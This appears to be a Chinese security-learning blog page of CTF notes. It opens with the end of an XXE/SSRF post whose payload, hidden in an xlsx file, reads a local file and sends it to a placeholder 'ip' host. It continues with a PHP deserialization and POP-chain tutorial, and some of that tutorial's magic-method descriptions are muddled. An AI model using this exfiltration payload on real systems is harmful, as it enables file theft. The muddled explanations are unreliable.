<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip:8001/file.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后将文件重新压缩，并改后缀为<code>xlsx</code></p>
<p>接着使用<code>python3</code>起一个HTTP服务<code>python -m http.server 8001</code>开启HTTP服务，并放置<code>file.dtd</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:8989?p=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<p>开启监听，上传xlsx文件</p>
<pre><code>
如果你有任何其他需求或需要进一步的解释，请告诉我。
</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/ssrf/" data-id="cm0kx5k5e000po8dk67spcxw5" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-jwt等认证went" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T12:48:49.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/">jwt等认证went</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/" data-id="cm0kx5k5a000bo8dkdm5s5vla" data-title="jwt等认证went" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-js原型链污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T12:48:22.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" data-id="cm0kx5k590009o8dk4f6l1oex" data-title="js原型链污染" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T11:54:39.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP-属性和权限"><a href="#PHP-属性和权限" class="headerlink" title="PHP 属性和权限"></a>PHP 属性和权限</h1><ul>
<li><p><strong>属性的权限，可以分为：</strong></p>
<ol>
<li><code>public</code> 权限 外部可以通过箭头访问到</li>
<li><code>private</code> 权限 内部通过 <code>$this-&gt;username</code> 访问到</li>
<li><code>protected</code> 权限 表示 自身及其子类 和父类 能够访问</li>
</ol>
</li>
<li><p><strong>抽象类</strong></p>
<ul>
<li>不能被 <code>new</code>，也就是不能被直接实例化对象</li>
</ul>
</li>
<li><p><strong>接口 <code>interface</code></strong></p>
<ul>
<li>为了实现多继承效果</li>
<li><code>implements</code> 可以实现多个接口</li>
</ul>
</li>
<li><p><strong>方法的属性修饰符</strong></p>
<ul>
<li><code>public</code></li>
<li><code>private</code></li>
<li><code>protected</code></li>
</ul>
</li>
<li><p><strong>修饰：</strong></p>
<ul>
<li>静态属性 <code>static</code></li>
<li><code>final</code> 属性 <code>final</code></li>
</ul>
</li>
</ul>
<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><ul>
<li>如果属性权限为 <code>private</code>，那么序列化后，存储的属性名字为 <code>%00+类名+%00+属性名</code></li>
<li>如果属性权限为 <code>protected</code>，那么序列化后，存储的属性名字为 <code>%00+*+%00+属性名</code></li>
<li>序列化是将一个对象变为一个可以传输的字符串 <code>serialize(对象)</code> 返回序列化后的字符串</li>
<li>反序列化就是将一个可以传输的字符串变为一个可以调用的对象 <code>unserialize(反序列化后的字符串)</code> 返回对象</li>
</ul>
<h3 id="反序列化示例："><a href="#反序列化示例：" class="headerlink" title="反序列化示例："></a>反序列化示例：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;</span><br><span class="line">	s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;John Doe&quot;</span>;</span><br><span class="line">	s:<span class="number">7</span>:<span class="string">&quot;address&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;Address&quot;</span>:<span class="number">2</span>:&#123;</span><br><span class="line">		s:<span class="number">4</span>:<span class="string">&quot;city&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;New York&quot;</span>;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">&quot;zip&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;10001&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line">	 s:<span class="number">12</span>:<span class="string">&quot;phoneNumbers&quot;</span>;a:<span class="number">2</span>:&#123;</span><br><span class="line">	 	i:<span class="number">0</span>;s:<span class="number">12</span>:<span class="string">&quot;123-456-7890&quot;</span>;</span><br><span class="line">	 	i:<span class="number">1</span>;s:<span class="number">12</span>:<span class="string">&quot;098-765-4321&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>反序列化时，PHP会做以下操作：</strong><ol>
<li>找到反序列化字符串规定的类名字 </li>
<li>实例化这个类，但不会调用构造方法</li>
<li>有了实例化的类对象，对它的属性进行赋值</li>
<li>执行魔术方法 <code>__wakeup()</code> 和 <code>__unserialize()</code></li>
<li>返回构造好的对象</li>
</ol>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Address</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zip</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$city</span>, <span class="variable">$zip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;city = <span class="variable">$city</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;zip = <span class="variable">$zip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$address</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phoneNumbers</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$address</span>, <span class="variable">$phoneNumbers</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;address = <span class="variable">$address</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;phoneNumbers = <span class="variable">$phoneNumbers</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$address</span> = <span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;New York&quot;</span>, <span class="string">&quot;10001&quot;</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="variable">$address</span>, <span class="keyword">array</span>(<span class="string">&quot;123-456-7890&quot;</span>, <span class="string">&quot;098-765-4321&quot;</span>));</span><br><span class="line"><span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serializedData</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>结果是：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;</span><br><span class="line">	s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;John Doe&quot;</span>;</span><br><span class="line">	s:<span class="number">7</span>:<span class="string">&quot;address&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;Address&quot;</span>:<span class="number">2</span>:&#123;</span><br><span class="line">		s:<span class="number">4</span>:<span class="string">&quot;city&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;New York&quot;</span>;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">&quot;zip&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;10001&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line">	 s:<span class="number">12</span>:<span class="string">&quot;phoneNumbers&quot;</span>;a:<span class="number">2</span>:&#123;</span><br><span class="line">	 	i:<span class="number">0</span>;s:<span class="number">12</span>:<span class="string">&quot;123-456-7890&quot;</span>;</span><br><span class="line">	 	i:<span class="number">1</span>;s:<span class="number">12</span>:<span class="string">&quot;098-765-4321&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>解读序列化字符串：</strong></p>
<ol>
<li><p><strong>识别外层对象：</strong></p>
<ul>
<li><code>O:4:&quot;User&quot;:3:</code></li>
<li><code>O</code> 表示对象（Object）。</li>
<li><code>4</code> 表示类名长度。</li>
<li><code>&quot;User&quot;</code> 是类名。</li>
<li><code>3</code> 表示对象的属性数量。</li>
</ul>
</li>
<li><p><strong>解析对象属性：</strong></p>
<ul>
<li><code>&#123;s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;;s:7:&quot;address&quot;;O:7:&quot;Address&quot;:2:&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;s:12:&quot;phoneNumbers&quot;;a:2:&#123;i:0;s:12:&quot;123-456-7890&quot;;i:1;s:12:&quot;098-765-4321&quot;;&#125;&#125;</code></li>
<li>解析第一个属性：<ul>
<li><code>s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;</code></li>
</ul>
</li>
<li>解析第二个属性：<ul>
<li><code>s:7:&quot;address&quot;;O:7:&quot;Address&quot;:2:&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;</code></li>
<li><code>s:7:&quot;address&quot;</code> 表示字符串属性名，长度为 7，内容是 “address”</li>
<li><code>O:7:&quot;Address&quot;:2:</code> 表示一个嵌套的 Address 对象</li>
<li><code>&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;</code> 包含了 Address 对象的属性。</li>
<li><code>s:4:&quot;city&quot;;s:8:&quot;New York&quot;;</code> 表示 Address 对象的第一个属性。</li>
<li><code>s:4:&quot;city&quot;</code> 表示字符串属性名，长度为 4，内容是 “city”。</li>
<li><code>s:8:&quot;New York&quot;</code> 表示字符串属性值，长度为 8，内容是 “New York”。</li>
<li><code>s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;</code> 表示 Address 对象的第二个属性。</li>
<li><code>s:3:&quot;zip&quot;</code> 表示字符串属性名，长度为 3，内容是 “zip”。</li>
<li><code>s:5:&quot;10001&quot;</code> 表示字符串属性值，长度为 5，内容是 “10001”。</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
<li><p><strong><code>$this</code>解释为当前对象里的：</strong></p>
<ul>
<li><code>__construct</code>：当一个对象被创建时自动调用这个方法，可以用来初始化对象的属性。</li>
<li><code>__destruct</code>：当 PHP 脚本执行结束前一秒当一个对象被销毁前自动调用这个方法，可以用来释放对象占用的资源。</li>
<li><code>__call</code>：在对象中调用一个不存在的方法时自动调用这个方法，可以用来实现动态方法调用。</li>
<li><code>__callStatic</code>：在静态上下文中调用一个不存在的方法时自动调用这个方法，可以用来实现动态静态方法调用。</li>
<li><code>__get</code>：当读取（<code>echo</code>）访问（<code>$myObject-&gt;age;</code>）一个不存在或不可访问的属性时，<code>__get</code> 方法会被自动调用。</li>
<li><code>__set</code>：当设置（赋值）一个不存在或不可访问的属性时，<code>__set</code> 方法会被自动调用。</li>
<li><code>__isset</code>：当使用 <code>isset()</code> 或 <code>empty()</code> 测试一个对象的属性是否存在时自动调用这个方法，可以用来实现属性的访问控制。</li>
<li><code>__unset</code>：当使用 <code>unset()</code> 删除一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</li>
<li><code>__toString</code>：当一个对象被当做字符串时（<code>echo $myObject;</code>）（<code>preg_match</code>时）自动调用这个方法，可以用来实现对象的字符串表示。</li>
<li><code>__invoke</code>：当一个对象被作为函数调用<code>$myObject(&#39;ChatGPT&#39;);</code>自动调用这个方法，可以用来实现对象的可调用性。</li>
<li><code>__set_state</code>：当使用 <code>var_export()</code> 导出一个对象时自动调用这个方法，可以用来实现对象的序列化和反序列化。</li>
<li><code>__clone</code>：当一个对象被克隆时自动调用这个方法，可以用来实现对象的克隆。</li>
<li><code>__debugInfo</code>：当使用 <code>var_dump()</code> 或 <code>print_r()</code> 输出一个对象时自动调用这个方法，可以用来控制对象的调试信息输出。</li>
<li><code>__sleep</code>：在对象被序列化之前自动调用这个方法，可以用来控制哪些属性被序列化。</li>
<li><code>__wakeup</code>：在对象被反序列化之后自动调用这个方法，可以用来重新初始化对象的属性。</li>
<li><code>__unserialize()</code> 是 PHP 7.4 中引入的一个魔术方法，将对象序列化为数组，同时在序列化时对敏感数据（如密码）进行加密处理。在PHP7.4.0开始，如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法。</li>
<li><code>__serialize()</code> 方法：反序列化时，从数组中恢复对象状态，并对敏感数据（如密码）进行解密处理。使用 <code>serialize()</code> 将对象序列化为字符串时，<code>__serialize()</code> 方法被调用，并将属性打包为数组。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="这里是被调用的例子"><a href="#这里是被调用的例子" class="headerlink" title="这里是被调用的例子"></a>这里是被调用的例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __set() 方法在给不存在的属性赋值时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;设置属性 &#x27;<span class="subst">$name</span>&#x27; 为 &#x27;<span class="subst">$value</span>&#x27;。&quot;</span> . PHP_EOL;      <span class="comment">//设置属性 &#x27;name&#x27; 为 &#x27;ChatGPT&#x27;。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __get() 方法在访问不存在的属性时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;访问属性 &#x27;<span class="subst">$name</span>&#x27;，值为：&quot;</span> . <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] . PHP_EOL;    <span class="comment">//访问属性 &#x27;name&#x27;，值为：ChatGPT</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;属性 &#x27;<span class="subst">$name</span>&#x27; 不存在。&quot;</span> . PHP_EOL;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]);</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// __unset() 方法，用于删除属性</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>])) &#123;</span><br><span class="line">			<span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;属性 &#x27;<span class="subst">$name</span>&#x27; 已被删除。&quot;</span> . PHP_EOL;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;属性 &#x27;<span class="subst">$name</span>&#x27; 不存在。&quot;</span> . PHP_EOL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;对象的名称是：&quot;</span> . <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">// __invoke() 方法会在对象被当作函数调用时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;message . <span class="string">&quot;, &quot;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// __sleep() 方法在对象序列化之前调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 仅返回需要序列化的属性</span></span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// __wakeup() 方法在对象反序列化之后调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 重新初始化或恢复对象的状态</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionData = <span class="string">&quot;Session data restored&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建类的实例</span></span><br><span class="line"><span class="variable">$myObject</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="comment">// 设置不存在的属性</span></span><br><span class="line"><span class="variable">$myObject</span>-&gt;name = <span class="string">&#x27;ChatGPT&#x27;</span>;</span><br><span class="line"><span class="comment">// 访问不存在的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$myObject</span>-&gt;name . PHP_EOL;</span><br><span class="line"><span class="variable">$nonExistent</span> = <span class="variable">$myObject</span>-&gt;age;</span><br><span class="line"><span class="comment">// 访问未设置的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$myObject</span>-&gt;age . PHP_EOL;</span><br><span class="line"><span class="comment">// 使用 isset() 检查属性是否存在</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$myObject</span>-&gt;name)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;属性 &#x27;name&#x27; 存在。&quot;</span> . PHP_EOL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;属性 &#x27;name&#x27; 不存在。&quot;</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除属性</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$myObject</span>-&gt;name);</span><br><span class="line"><span class="comment">// 直接输出对象，自动调用 __toString()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$myObject</span>;</span><br><span class="line"><span class="comment">// 直接调用对象，自动调用 __invoke()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$myObject</span>(<span class="string">&#x27;ChatGPT&#x27;</span>);</span><br><span class="line"><span class="comment">// 序列化对象__sleep() 方法返回一个包含 &#x27;name&#x27; 的数组，表示只有 name 属性会被序列化。serialize($myObject) 时，password 和 sessionData 属性不会被序列化，因为它们没有包含在 __sleep() 方法返回的数组中。</span></span><br><span class="line"><span class="variable">$serializedObject</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$myObject</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serializedObject</span>; <span class="comment">// 输出: O:7:&quot;MyClass&quot;:1:&#123;s:8:&quot;\0MyClass\0name&quot;;s:7:&quot;ChatGPT&quot;;&#125;</span></span><br><span class="line"><span class="comment">// 反序列化对象</span></span><br><span class="line"><span class="variable">$unserializedObject</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializedObject</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="三种方法赋值"><a href="#三种方法赋值" class="headerlink" title="三种方法赋值"></a>三种方法赋值</h3><ol>
<li><p><strong>直接写只能写字符串：</strong></p>
<ul>
<li><code>private $username = &#39;xxxxxx&#39;;</code></li>
</ul>
</li>
<li><p><strong>外部写意图把类里的 <code>$a</code> 变量其他 <code>$b</code>，这样就写出了 pop，即：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SHOW;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> CTF;</span><br><span class="line"><span class="variable">$s</span>-&gt;a = <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>但是不能对私有属性进行赋值。</li>
</ul>
</li>
<li><p><strong>构造方法赋值：</strong></p>
<ul>
<li>以上缺点都没了：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backdoor</span>();</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h1 id="构造-pop-链"><a href="#构造-pop-链" class="headerlink" title="构造 pop 链"></a>构造 pop 链</h1><ul>
<li><strong>重点找起始和 RCE 终点，期间的变量赋值为变量时要外部赋值，普通变量就直接赋值。</strong></li>
<li><strong>链子：</strong>终点开始编写链子，期间用各种魔法方法到起点（利用 <code>new</code> 关键词开始 <code>construct</code>，<code>destruct</code>，<code>wakeup</code>），再把起点对象序列化。</li>
<li><strong>检查就是从后往前读了。</strong></li>
</ul>
<h1 id="序列化绕过"><a href="#序列化绕过" class="headerlink" title="序列化绕过"></a>序列化绕过</h1><ul>
<li><strong>绕过 <code>\0</code> 脚本或利用 PHP 7.1+ 的特性，直接用 <code>public</code> 生成字符串但容错机制。</strong></li>
